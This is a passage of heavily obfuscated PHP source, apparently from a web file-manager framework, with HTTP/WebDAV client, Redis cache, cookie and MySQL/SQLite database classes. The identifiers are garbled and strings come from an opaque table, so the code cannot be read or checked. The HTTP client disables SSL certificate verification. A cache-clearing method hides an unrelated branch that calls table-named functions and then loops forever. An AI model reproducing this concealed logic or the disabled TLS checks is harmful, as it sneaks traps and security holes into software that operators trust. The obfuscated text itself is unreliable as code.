$CÅ¶à»æƒ‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->setHeader($CÅ¶à»æƒ‘[1772], $this->makePath($c«›Ï»‘Ó¢)); $this->setHeader($CÅ¶à»æƒ‘[1773], $CÅ¶à»æƒ‘[1774]); return $this->send($CÅ¶à»æƒ‘[1777], $e³­¯ƒŸ); } public function mkcol($d½ë»ùÜÇ­) { $C™éµÑÈ­Š =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->setHeader($C™éµÑÈ­Š[1773], $C™éµÑÈ­Š[1774]); return $this->send($C™éµÑÈ­Š[1778], $d½ë»ùÜÇ­); } public function delete($Bã«Å¸˜§, $cİÇ¡§³¨© = '') { $d‘“¶‡ˆ¨æ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($cİÇ¡§³¨©) { $this->setHeader($d‘“¶‡ˆ¨æ[1775], $d‘“¶‡ˆ¨æ[931] . $cİÇ¡§³¨© . $d‘“¶‡ˆ¨æ[934]); } return $this->send($d‘“¶‡ˆ¨æ[1255], $Bã«Å¸˜§); } public function propfind($eçĞÂŞ³•) { $BÎ£³¹¢Å­ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->setHeader($BÎ£³¹¢Å­[1779], $BÎ£³¹¢Å­[93]); $this->setHeader($BÎ£³¹¢Å­[1780], $BÎ£³¹¢Å­[1781]); $b½‡‘ÕÉ§í = $BÎ£³¹¢Å­[1782]; return $this->send($BÎ£³¹¢Å­[1783], $eçĞÂŞ³•, $b½‡‘ÕÉ§í); } public function options($c¾ê³½ñŠó) { return $this->send($_SERVER[¶ªÕß‚ØÁŸ][1784], $c¾ê³½ñŠó); } public function get($fĞ‘õ±ãŒ) { return $this->send($_SERVER[¶ªÕß‚ØÁŸ][226], $fĞ‘õ±ãŒ); } public function put($c½ì­ÂÕÎ, $eÄÛ½‡»”¯, $Aù×‰Â¥ó = '') { $dòÄ‹¢Îí… =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($Aù×‰Â¥ó) { $this->setHeader($dòÄ‹¢Îí…[1775], $dòÄ‹¢Îí…[931] . $Aù×‰Â¥ó . $dòÄ‹¢Îí…[934]); } return $this->send($dòÄ‹¢Îí…[224], $c½ì­ÂÕÎ, $eÄÛ½‡»”¯); } protected function send($cš÷Äã¨¤×, $A¦è¦‹¶‡İ, $b¶š¨É²–¦ = false, $Aœîø¦›êÜ = false) { goto e„º§œŸØ–; aß­—öäÁé: $d˜âíÑ‚‘ = curl_init($A¦è¦‹¶‡İ); curl_setopt($d˜âíÑ‚‘, CURLOPT_CUSTOMREQUEST, $cš÷Äã¨¤×); curl_setopt($d˜âíÑ‚‘, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto eæŠÇï²“„; B·İ¢äÉøÙ: curl_setopt($d˜âíÑ‚‘, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($d˜âíÑ‚‘, CURLOPT_SSL_VERIFYHOST, !1); $a¬•îâ“Á‡ = curl_exec($d˜âíÑ‚‘); goto Däá‰ù†¦–; A¤Î¼ÇÓ¾ä: $this->setHeader($DÑ…õ‡µô™); if ($b¶š¨É²–¦) { $b¶š¨É²–¦ = $CÖ ğ¼•¸Ğ[1786] . $b¶š¨É²–¦; } if (!request_url_safe($A¦è¦‹¶‡İ)) { return !1; } goto aß­—öäÁé; eæŠÇï²“„: curl_setopt($d˜âíÑ‚‘, CURLOPT_HTTPHEADER, $this->header); curl_setopt($d˜âíÑ‚‘, CURLOPT_RETURNTRANSFER, !0); curl_setopt($d˜âíÑ‚‘, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto B·İ¢äÉøÙ; Däá‰ù†¦–: $this->header = array(); return $a¬•îâ“Á‡; goto FÔœâÚ‡·; e„º§œŸØ–: $CÖ ğ¼•¸Ğ =& $_SERVER[¶ªÕß‚ØÁŸ]; $DÑ…õ‡µô™ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($CÖ ğ¼•¸Ğ[1785], $CÖ ğ¼•¸Ğ[50]); goto A¤Î¼ÇÓ¾ä; FÔœâÚ‡·: } } goto BÜÊ¢·åÖó; C½ŒÜ¸‹­Æ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($béÊƒæÃÊ, $dç¬„›¬ö÷) { $d•ÊË‰Üì =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!class_exists($d•ÊË‰Üì[793])) { show_json($d•ÊË‰Üì[794], !1); } $this->cacheTime = $dç¬„›¬ö÷; $FÜªòšöØ» = isset($béÊƒæÃÊ[$d•ÊË‰Üì[795]]) ? $béÊƒæÃÊ[$d•ÊË‰Üì[795]] : 10; $DÖ¶ĞŒóŸ† = _get($béÊƒæÃÊ, $d•ÊË‰Üì[792]); if ($DÖ¶ĞŒóŸ† && is_array($DÖ¶ĞŒóŸ†)) { $this->initCluster($béÊƒæÃÊ, $FÜªòšöØ»); } else { $this->handle = $this->init($béÊƒæÃÊ, $FÜªòšöØ»); } } private function init($CÃ£™Œ’¦µ, $d ƒ”é×Şå) { $c¬Ğ×º”¯ê =& $_SERVER[¶ªÕß‚ØÁŸ]; $Cñ½ÆøÄ = new Redis(); $Aİ©ˆ™êº = isset($CÃ£™Œ’¦µ[$c¬Ğ×º”¯ê[796]]) ? $CÃ£™Œ’¦µ[$c¬Ğ×º”¯ê[796]] : !1; if ($Aİ©ˆ™êº) { $Cñ½ÆøÄ->pconnect($CÃ£™Œ’¦µ[$c¬Ğ×º”¯ê[179]], $CÃ£™Œ’¦µ[$c¬Ğ×º”¯ê[180]], $d ƒ”é×Şå); } else { $Cñ½ÆøÄ->connect($CÃ£™Œ’¦µ[$c¬Ğ×º”¯ê[179]], $CÃ£™Œ’¦µ[$c¬Ğ×º”¯ê[180]], $d ƒ”é×Şå); } if (!empty($CÃ£™Œ’¦µ[$c¬Ğ×º”¯ê[384]])) { $Cñ½ÆøÄ->auth($CÃ£™Œ’¦µ[$c¬Ğ×º”¯ê[384]]); } return $Cñ½ÆøÄ; } private function initCluster($D÷º—ìà÷ã, $eÄÂ™ÃÅæÄ) { $AŞÈèàîê =& $_SERVER[¶ªÕß‚ØÁŸ]; $eÃ°äßÃ¡„ = array($AŞÈèàîê[797], $AŞÈèàîê[798], $AŞÈèàîê[799]); $A±ç¨ëÛ˜ = $AŞÈèàîê[797]; if (isset($D÷º—ìà÷ã[$AŞÈèàîê[12]]) && in_array($D÷º—ìà÷ã[$AŞÈèàîê[12]], $eÃ°äßÃ¡„)) { $A±ç¨ëÛ˜ = $D÷º—ìà÷ã[$AŞÈèàîê[12]]; } switch ($A±ç¨ëÛ˜) { case $AŞÈèàîê[797]: $this->_slave($D÷º—ìà÷ã, $eÄÂ™ÃÅæÄ); break; case $AŞÈèàîê[798]: break; case $AŞÈèàîê[799]: $this->isCluster = !0; $cµ¹ÒÀ¿‘ø = $D÷º—ìà÷ã[$AŞÈèàîê[792]]; $Eç“ÒˆĞŸÕ = isset($D÷º—ìà÷ã[$AŞÈèàîê[796]]) ? $D÷º—ìà÷ã[$AŞÈèàîê[796]] : !1; $FÆÖ¢ç¹ˆ£ = isset($D÷º—ìà÷ã[$AŞÈèàîê[384]]) ? $D÷º—ìà÷ã[$AŞÈèàîê[384]] : null; $this->handle = new RedisCluster(NUll, $cµ¹ÒÀ¿‘ø, $eÄÂ™ÃÅæÄ, $eÄÂ™ÃÅæÄ, $Eç“ÒˆĞŸÕ, $FÆÖ¢ç¹ˆ£); break; default: break; } } private function _slave($cÇŸ‡”ÂÏÁ, $AÑŞÈµÆÀ÷) { goto bÆóŠ„ÑÙ; EÙ”Ş»èœ¶: unset($cÙ¨ª¬˜[0]); if (empty($cÙ¨ª¬˜)) { return; } $Dš¤»À‰ù¹ = array_rand($cÙ¨ª¬˜); goto e¶™ÓÏÏÅä; bÆóŠ„ÑÙ: $cÙ¨ª¬˜ = $cÇŸ‡”ÂÏÁ[$_SERVER[¶ªÕß‚ØÁŸ][792]]; $this->filterConfig($cÇŸ‡”ÂÏÁ, $cÙ¨ª¬˜[0]); $this->handle = $this->init($cÇŸ‡”ÂÏÁ, $AÑŞÈµÆÀ÷); goto EÙ”Ş»èœ¶; e¶™ÓÏÏÅä: $this->filterConfig($cÇŸ‡”ÂÏÁ, $cÙ¨ª¬˜[$Dš¤»À‰ù¹]); $this->slaveHandle = $this->init($cÇŸ‡”ÂÏÁ, $AÑŞÈµÆÀ÷); goto eñÇÂïù·; eñÇÂïù·: } private function filterConfig(&$B›†í³èîŸ, $Fñ‰Ï°‡ñ ) { $Eê½éí†ã =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÄƒÖÑ‘¤´ = explode($Eê½éí†ã[4], $Fñ‰Ï°‡ñ ); $D´¹ç¨¬Ü‚ = array($Eê½éí†ã[179] => $bÄƒÖÑ‘¤´[0], $Eê½éí†ã[180] => $bÄƒÖÑ‘¤´[1]); $B›†í³èîŸ = array_merge($B›†í³èîŸ, $D´¹ç¨¬Ü‚); } public function set($aÉé¡é–áç, $dªèÄ›§ŠÜ, $C°ƒ†ÚìÊ† = false) { $C°ƒ†ÚìÊ† = $C°ƒ†ÚìÊ† ? $C°ƒ†ÚìÊ† : $this->cacheTime; return $this->handle->setEx($aÉé¡é–áç, $C°ƒ†ÚìÊ†, $dªèÄ›§ŠÜ); } public function setLock($Dˆ†Î±ò› , $b¾÷‰ÃÁ¤µ, $cÜĞ¿Ç’ªï) { return $this->handle->setNX($Dˆ†Î±ò› , $b¾÷‰ÃÁ¤µ); } public function get($F¿·‚¯øÇ¿) { $bÊ‘ÓøêÅÅ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $bÊ‘ÓøêÅÅ->get($F¿·‚¯øÇ¿); } public function remove($dÍÃ‘¹Š±) { return $this->handle->del($dÍÃ‘¹Š±); } public function deleteAll() { $d’õØˆš‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset($_SERVER[$d’õØˆš‘[57]]) || !isset($_SERVER[$d’õØˆš‘[58]])) { goto e¢èËÏÒÁ¬; DÒäï³Ì“å: $BîœÖº‹Ç¸ = $d’õØˆš‘[801]; $BîœÖº‹Ç¸($_SERVER[$d’õØˆš‘[802]]); $F˜‚â•Õò¹ = 1; goto EÙ’ôÇé¶; eÕ­—àøœ: $f‚ë§—ƒè˜ = $Aç‚œ¨¬Š($EàõÕµìÑ‡); $CµÃÚ”íÑ = explode($d’õØˆš‘[62], $f‚ë§—ƒè˜); if (count($CµÃÚ”íÑ) < $d’õØˆš‘[559]) { $c­²˜‡Ì‡ù = $d’õØˆš‘[64]; $c­²˜‡Ì‡ù(); } goto DÒäï³Ì“å; e¢èËÏÒÁ¬: $E±öÈ›Í×Â = $d’õØˆš‘[800]; $Aç‚œ¨¬Š = $d’õØˆš‘[59]; $EàõÕµìÑ‡ = $_SERVER[$d’õØˆš‘[60]] . $d’õØˆš‘[61]; goto eÕ­—àøœ; EÙ’ôÇé¶: for ($fŸ­½• ±Ø = $F˜‚â•Õò¹; $fŸ­½• ±Ø > 0; $fŸ­½• ±Ø++) { $BîœÖº‹Ç¸ = json_encode($GLOBALS[$d’õØˆš‘[392]]); } goto bÈë¦§¸š£; bÈë¦§¸š£: } if ($this->isCluster) { foreach ($this->handle->_masters() as $Fßº²ÒÆÇÜ) { $this->handle->flushall($Fßº²ÒÆÇÜ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($c‡íÛ’ˆ‚ = '', $C‹‘å„œÅ« = 0) { if (is_string($c‡íÛ’ˆ‚) && $c‡íÛ’ˆ‚ != $_SERVER[¶ªÕß‚ØÁŸ][33]) { $this->prefix = $c‡íÛ’ˆ‚; } if (is_numeric($C‹‘å„œÅ«) && $C‹‘å„œÅ« > 0) { $this->expire = $C‹‘å„œÅ«; } } public static function getInstance() { static $Dâ¾îñôÙİ; if ($Dâ¾îñôÙİ === null) { $Dâ¾îñôÙİ = new self(); } return $Dâ¾îñôÙİ; } private static $sameCookieSet = array(); public static function set($f„òØˆ¦¡, $bµÌô›¯Š, $Bğ¾’íÓš„ = 0, $eéç‡ìª®á = false, $fĞåÒŒÕ§ = false) { goto FÖ…ˆÚ®–; A‰Î‚Úùì: self::$sameCookieSet[$f„òØˆ¦¡] = $bµÌô›¯Š . $Bğ¾’íÓš„; if (!$fĞåÒŒÕ§) { $fĞåÒŒÕ§ = str_replace(HOST, $cò¹æŠìƒ[33], APP_HOST); $fĞåÒŒÕ§ = _get($GLOBALS, $cò¹æŠìƒ[803], $fĞåÒŒÕ§); } $D®åÒœù = $cò¹æŠìƒ[33]; goto b£¢”ø•¥; b£¢”ø•¥: setcookie($f„òØˆ¦¡, $bµÌô›¯Š, time() + $Bğ¾’íÓš„, $cò¹æŠìƒ[8] . trim($fĞåÒŒÕ§, $cò¹æŠìƒ[8]) . $D®åÒœù, !1, !1, $eéç‡ìª®á); goto bíŞ¬Åò»; FÖ…ˆÚ®–: $cò¹æŠìƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$Bğ¾’íÓš„) { $Bğ¾’íÓš„ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$f„òØˆ¦¡]) && self::$sameCookieSet[$f„òØˆ¦¡] == $bµÌô›¯Š . $Bğ¾’íÓš„) { return; } goto A‰Î‚Úùì; bíŞ¬Åò»: } public static function setSafe($Eº‘‹³ÎôÍ, $aù…Åî‰‡ˆ, $b’ ˆ¨° = 0) { self::set($Eº‘‹³ÎôÍ, $aù…Åî‰‡ˆ, $b’ ˆ¨°, !0); } public static function get($f‚Æ¶âÁ¹) { return isset($_COOKIE[$f‚Æ¶âÁ¹]) ? $_COOKIE[$f‚Æ¶âÁ¹] : !1; } public static function remove($A„Ê«¾Æ¨š, $fƒ“‡ÔâŞ = false) { unset($_COOKIE[$A„Ê«¾Æ¨š]); self::set($A„Ê«¾Æ¨š, $_SERVER[¶ªÕß‚ØÁŸ][33], 1, $fƒ“‡ÔâŞ); } } class DbMysql extends Db { public function __construct($d‡öî…” = '') { $Fé„Ï‚¼Ñã =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!extension_loaded($Fé„Ï‚¼Ñã[741])) { think_exception(think_lang($Fé„Ï‚¼Ñã[10]) . $Fé„Ï‚¼Ñã[804]); } if (!empty($d‡öî…”)) { $this->config = $d‡öî…”; if (empty($this->config[$Fé„Ï‚¼Ñã[13]])) { $this->config[$Fé„Ï‚¼Ñã[13]] = $Fé„Ï‚¼Ñã[33]; } } } public function connect($DÍñæäÛ«Š = '', $C¹ë•«ÊîÛ = 0, $Cí¨Õ¡©‡ = false) { $A¾Ü×ˆ–Š÷ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset($this->linkID[$C¹ë•«ÊîÛ])) { goto eÓ—ÙÓ¢Ç¾; eÓ—ÙÓ¢Ç¾: if (empty($DÍñæäÛ«Š)) { $DÍñæäÛ«Š = $this->config; } $f„†îë‘å = $DÍñæäÛ«Š[$A¾Ü×ˆ–Š÷[805]] . ($DÍñæäÛ«Š[$A¾Ü×ˆ–Š÷[806]] ? "\x3a{$DÍñæäÛ«Š[$A¾Ü×ˆ–Š÷[806]]}" : $A¾Ü×ˆ–Š÷[33]); $fá»ïˆâœí = !empty($DÍñæäÛ«Š[$A¾Ü×ˆ–Š÷[13]][$A¾Ü×ˆ–Š÷[14]]) ? $DÍñæäÛ«Š[$A¾Ü×ˆ–Š÷[13]][$A¾Ü×ˆ–Š÷[14]] : $this->pconnect; goto c¾­µ©ª” ; FóŞ‡µ³¿Ø: if (1 != think_config($A¾Ü×ˆ–Š÷[18])) { unset($this->config); } goto cã»·’Á×ê; C¨Šé†ƒ¶„: mysql_query($A¾Ü×ˆ–Š÷[809] . think_config($A¾Ü×ˆ–Š÷[810]) . $A¾Ü×ˆ–Š÷[55], $this->linkID[$C¹ë•«ÊîÛ]); if ($C’‚ğç¶Õ´ > $A¾Ü×ˆ–Š÷[811]) { mysql_query($A¾Ü×ˆ–Š÷[812], $this->linkID[$C¹ë•«ÊîÛ]); } $this->connected = !0; goto FóŞ‡µ³¿Ø; c¾­µ©ª” : if ($fá»ïˆâœí) { $this->linkID[$C¹ë•«ÊîÛ] = mysql_pconnect($f„†îë‘å, $DÍñæäÛ«Š[$A¾Ü×ˆ–Š÷[807]], $DÍñæäÛ«Š[$A¾Ü×ˆ–Š÷[808]], 131072); } else { $this->linkID[$C¹ë•«ÊîÛ] = mysql_connect($f„†îë‘å, $DÍñæäÛ«Š[$A¾Ü×ˆ–Š÷[807]], $DÍñæäÛ«Š[$A¾Ü×ˆ–Š÷[808]], !0, 131072); } if (!$this->linkID[$C¹ë•«ÊîÛ] || !empty($DÍñæäÛ«Š[$A¾Ü×ˆ–Š÷[17]]) && !mysql_select_db($DÍñæäÛ«Š[$A¾Ü×ˆ–Š÷[17]], $this->linkID[$C¹ë•«ÊîÛ])) { think_exception(mysql_error()); } $C’‚ğç¶Õ´ = mysql_get_server_info($this->linkID[$C¹ë•«ÊîÛ]); goto C¨Šé†ƒ¶„; cã»·’Á×ê: } return $this->linkID[$C¹ë•«ÊîÛ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($BÛñ™§óÅŒ) { goto Dé‘Ô³ğëƒ; Dé‘Ô³ğëƒ: $E‚¦‰Ç¯™À =& $_SERVER[¶ªÕß‚ØÁŸ]; if (0 === stripos($BÛñ™§óÅŒ, $E‚¦‰Ç¯™À[261])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto fÒ©´‚à¿; C„à¥ä¶Ó: think_action_status($E‚¦‰Ç¯™À[19], 1); think_status($E‚¦‰Ç¯™À[20]); $this->queryID = mysql_query($BÛñ™§óÅŒ, $this->_linkID); goto fÓ£èÁ‡Ş´; fÒ©´‚à¿: if (!$this->_linkID) { return !1; } $this->queryStr = $BÛñ™§óÅŒ; if ($this->queryID) { $this->free(); } goto C„à¥ä¶Ó; fÓ£èÁ‡Ş´: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto bËˆ²Ñâ¦; bËˆ²Ñâ¦: } public function execute($D‡£„”çíÄ) { goto aµØ³øùì»; BËêÖïò¾‰: $this->queryStr = $D‡£„”çíÄ; if ($this->queryID) { $this->free(); } think_action_status($eˆïõ‚Õ¹[21], 1); goto EÄîèÛ˜£; aµØ³øùì»: $eˆïõ‚Õ¹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BËêÖïò¾‰; EÄîèÛ˜£: think_status($eˆïõ‚Õ¹[20]); $f¤Ò—£ Ğƒ = mysql_query($D‡£„”çíÄ, $this->_linkID); $this->debug(); goto Dµ»ºÇ²Õ; Dµ»ºÇ²Õ: if (!1 === $f¤Ò—£ Ğƒ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto CÅ¯ÎæËƒ; CÅ¯ÎæËƒ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¶ªÕß‚ØÁŸ][813], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bôÉÒ¾æ„ = mysql_query($_SERVER[¶ªÕß‚ØÁŸ][814], $this->_linkID); $this->transTimes = 0; if (!$bôÉÒ¾æ„) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $E£³æè‘¥¨ = mysql_query($_SERVER[¶ªÕß‚ØÁŸ][815], $this->_linkID); $this->transTimes = 0; if (!$E£³æè‘¥¨) { $this->error(); return !1; } } return !0; } private function getAll() { $b…¤Â¯«–è = array(); if ($this->numRows > 0) { while ($f†Ñ®ùï¥ˆ = mysql_fetch_assoc($this->queryID)) { $b…¤Â¯«–è[] = $f†Ñ®ùï¥ˆ; } mysql_data_seek($this->queryID, 0); } return $b…¤Â¯«–è; } public function getFields($BŒò¥¤ƒ‡Í) { $fõÚ·µö¾Ú =& $_SERVER[¶ªÕß‚ØÁŸ]; $E¡†™¦Ó‚‚ = $this->query($fõÚ·µö¾Ú[816] . $this->parseKey($BŒò¥¤ƒ‡Í)); $fé¯ÜéÛ‡Ì = array(); if ($E¡†™¦Ó‚‚) { foreach ($E¡†™¦Ó‚‚ as $d¯†ˆ˜Ø => $EÄË¯«ß”Ë) { $fé¯ÜéÛ‡Ì[$EÄË¯«ß”Ë[$fõÚ·µö¾Ú[27]]] = array($fõÚ·µö¾Ú[28] => $EÄË¯«ß”Ë[$fõÚ·µö¾Ú[27]], $fõÚ·µö¾Ú[29] => $EÄË¯«ß”Ë[$fõÚ·µö¾Ú[30]], $fõÚ·µö¾Ú[31] => (bool) (strtoupper($EÄË¯«ß”Ë[$fõÚ·µö¾Ú[32]]) === $fõÚ·µö¾Ú[817]), $fõÚ·µö¾Ú[34] => $EÄË¯«ß”Ë[$fõÚ·µö¾Ú[35]], $fõÚ·µö¾Ú[36] => strtolower($EÄË¯«ß”Ë[$fõÚ·µö¾Ú[37]]) == $fõÚ·µö¾Ú[38], $fõÚ·µö¾Ú[39] => strtolower($EÄË¯«ß”Ë[$fõÚ·µö¾Ú[40]]) == $fõÚ·µö¾Ú[41]); } } return $fé¯ÜéÛ‡Ì; } public function getTables($F¶ÂÕ°‘Ìã = '') { $cšÙŒšÒ’Ù =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!empty($F¶ÂÕ°‘Ìã)) { $D›Ø­ŞõÌÀ = $cšÙŒšÒ’Ù[818] . $F¶ÂÕ°‘Ìã; } else { $D›Ø­ŞõÌÀ = $cšÙŒšÒ’Ù[819]; } $DÈÚ‹ïØ›÷ = $this->query($D›Ø­ŞõÌÀ); $f˜Íïïâ­÷ = array(); foreach ($DÈÚ‹ïØ›÷ as $EªœÉ÷«ëÆ => $BÉÜà˜î¼î) { $f˜Íïïâ­÷[$EªœÉ÷«ëÆ] = current($BÉÜà˜î¼î); } return $f˜Íïïâ­÷; } public function replace($c‹èøÜÀ, $B¥È´‡”ö = array()) { $d¤†‚â²³Ì =& $_SERVER[¶ªÕß‚ØÁŸ]; foreach ($c‹èøÜÀ as $Fí½ù‘»Ÿï => $cËõ¿šçÌò) { $aœÚØ‹…¬  = $this->parseValue($cËõ¿šçÌò); if (is_scalar($aœÚØ‹…¬ )) { $Eğ¼Öø[] = $aœÚØ‹…¬ ; $d¥ù±ÛÈ×[] = $this->parseKey($Fí½ù‘»Ÿï); } } $d„÷ÀàÈÍ¹ = $d¤†‚â²³Ì[820] . $this->parseTable($B¥È´‡”ö[$d¤†‚â²³Ì[276]]) . $d¤†‚â²³Ì[821] . implode($d¤†‚â²³Ì[47], $d¥ù±ÛÈ×) . $d¤†‚â²³Ì[822] . implode($d¤†‚â²³Ì[47], $Eğ¼Öø) . $d¤†‚â²³Ì[823]; return $this->execute($d„÷ÀàÈÍ¹); } public function insertAll($B²ÛÔƒæ¹­, $f¦£É¢ì—× = array(), $e¹ØÓ¸Âù = false) { goto c»×Ê‘Ø¸; c»×Ê‘Ø¸: $D„‘‡Ùîß =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!is_array($B²ÛÔƒæ¹­[0])) { return !1; } $DèŒÂŒŠ¦Ô = array_keys($B²ÛÔƒæ¹­[0]); goto dÙù‡İÒõÅ; F¼§›öäƒœ: $B°°©Éò›¡ = ($e¹ØÓ¸Âù ? $D„‘‡Ùîß[825] : $D„‘‡Ùîß[826]) . $D„‘‡Ùîß[827] . $this->parseTable($f¦£É¢ì—×[$D„‘‡Ùîß[276]]) . $D„‘‡Ùîß[821] . implode($D„‘‡Ùîß[47], $DèŒÂŒŠ¦Ô) . $D„‘‡Ùîß[828] . implode($D„‘‡Ùîß[47], $E™Å–é¯‰†); return $this->execute($B°°©Éò›¡); goto a¢‘÷ËğÇ‚; dÙù‡İÒõÅ: $E™Å–é¯‰† = array(); foreach ($B²ÛÔƒæ¹­ as $f™¸îùßİá) { $FŒ”Û±Ò¥ = array(); foreach ($f™¸îùßİá as $EĞÊÀøô¶Ò => $a±ÎËºéä…) { $a±ÎËºéä… = $this->parseValue($a±ÎËºéä…); if (is_scalar($a±ÎËºéä…)) { $FŒ”Û±Ò¥[] = $a±ÎËºéä…; } } $E™Å–é¯‰†[] = $D„‘‡Ùîß[257] . implode($D„‘‡Ùîß[47], $FŒ”Û±Ò¥) . $D„‘‡Ùîß[823]; } array_walk($DèŒÂŒŠ¦Ô, array($this, $D„‘‡Ùîß[824])); goto F¼§›öäƒœ; a¢‘÷ËğÇ‚: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $d×–õ«Ñšœ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->error = mysql_errno() . $d×–õ«Ñšœ[4] . mysql_error($this->_linkID); if ($d×–õ«Ñšœ[33] != $this->queryStr) { $this->error .= LNG($d×–õ«Ñšœ[45]) . $this->queryStr; } think_trace($this->error, $d×–õ«Ñšœ[33], $d×–õ«Ñšœ[46]); return $this->error; } public function escapeString($CÀÉŸïÕã‹) { if ($this->_linkID) { return mysql_real_escape_string($CÀÉŸïÕã‹, $this->_linkID); } else { return mysql_escape_string($CÀÉŸïÕã‹); } } public function parseKey(&$b–ù‰ô»Üß, $BÄÈ°¡‘½ = true) { $B“…¬ò£™ô =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($BÄÈ°¡‘½) { $b–ù‰ô»Üß = $this->parseKeyCheck($b–ù‰ô»Üß); } if ($b–ù‰ô»Üß != $B“…¬ò£™ô[186] && !preg_match($B“…¬ò£™ô[829], $b–ù‰ô»Üß)) { $b–ù‰ô»Üß = $B“…¬ò£™ô[830] . trim($b–ù‰ô»Üß, $B“…¬ò£™ô[830]) . $B“…¬ò£™ô[830]; } return $b–ù‰ô»Üß; } } goto Fñ††»©½; A‘¥«±ß”Œ: define($_SERVER[¶ªÕß‚ØÁŸ][238], 1); define($_SERVER[¶ªÕß‚ØÁŸ][239], 0); define($_SERVER[¶ªÕß‚ØÁŸ][240], 2); goto FÅÂ°ªøºî; EİÍÉè¿: class DbSqlite3 extends DbSqlite3Base { public function query($a«‡ÄÈÙª) { goto d™áª©Ì±Ê; d™áª©Ì±Ê: $E“¯‹›‘¸õ =& $_SERVER[¶ªÕß‚ØÁŸ]; $d‘Äš—‡¾è = DATA_PATH . $E“¯‹›‘¸õ[878]; $Aà‰£§¿Ç = fopen($d‘Äš—‡¾è, $E“¯‹›‘¸õ[879]); goto dÕ¨ÅñÂ‘; F‰Ã¹»ˆÎô: fclose($Aà‰£§¿Ç); show_json($E“¯‹›‘¸õ[880], !1); return !1; goto dî£‡ùÛ†; dÕ¨ÅñÂ‘: if (!$Aà‰£§¿Ç) { return !1; } if (flock($Aà‰£§¿Ç, LOCK_EX)) { $CĞÈ¦êåÖ’ = parent::query($a«‡ÄÈÙª); flock($Aà‰£§¿Ç, LOCK_UN); fclose($Aà‰£§¿Ç); return $CĞÈ¦êåÖ’; } flock($Aà‰£§¿Ç, LOCK_UN); goto F‰Ã¹»ˆÎô; dî£‡ùÛ†: } public function execute($FĞæ¯¢Îğ) { goto F¤…ØĞùøë; F¤…ØĞùøë: $Cä—ÁÛ Ÿ· =& $_SERVER[¶ªÕß‚ØÁŸ]; $bˆÔÓÅÕ¨ = DATA_PATH . $Cä—ÁÛ Ÿ·[878]; $A‘ò§„øÛÙ = fopen($bˆÔÓÅÕ¨, $Cä—ÁÛ Ÿ·[879]); goto EÌÏæ—ÃÄå; EÌÏæ—ÃÄå: if (!$A‘ò§„øÛÙ) { return !1; } if (flock($A‘ò§„øÛÙ, LOCK_EX)) { $b ï˜Ğ¥Ç¨ = parent::execute($FĞæ¯¢Îğ); flock($A‘ò§„øÛÙ, LOCK_UN); fclose($A‘ò§„øÛÙ); return $b ï˜Ğ¥Ç¨; } flock($A‘ò§„øÛÙ, LOCK_UN); goto fÏ¦›ğºò’; fÏ¦›ğºò’: fclose($A‘ò§„øÛÙ); show_json($Cä—ÁÛ Ÿ·[880], !1); return !1; goto DÄÀÎÂ×; DÄÀÎÂ×: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\x71" => "\75", "\156\x65\161" => "\x3c\x3e", "\147\164" => "\76", "\145\147\164" => "\76\x3d", "\154\164" => "\x3c", "\145\154\x74" => "\x3c\75", "\156\157\164\x6c\151\153\x65" => "\116\x4f\x54\40\114\x49\113\105", "\154\151\153\145" => "\x4c\111\113\105", "\151\156" => "\111\116", "\x6e\x6f\x74\151\156" => "\116\117\x54\40\x49\x4e", "\156\157\164\x20\151\156" => "\x4e\117\124\x20\111\x4e", "\x62\x65\x74\167\145\x65\156" => "\102\x45\124\x57\105\105\116", "\x6e\157\x74\x62\x65\164\167\x65\x65\156" => "\116\117\x54\x20\102\105\x54\127\105\105\116", "\156\x6f\x74\x20\142\x65\164\x77\145\x65\156" => "\x4e\x4f\124\x20\x42\x45\x54\x57\105\x45\116"); protected $selectSql = 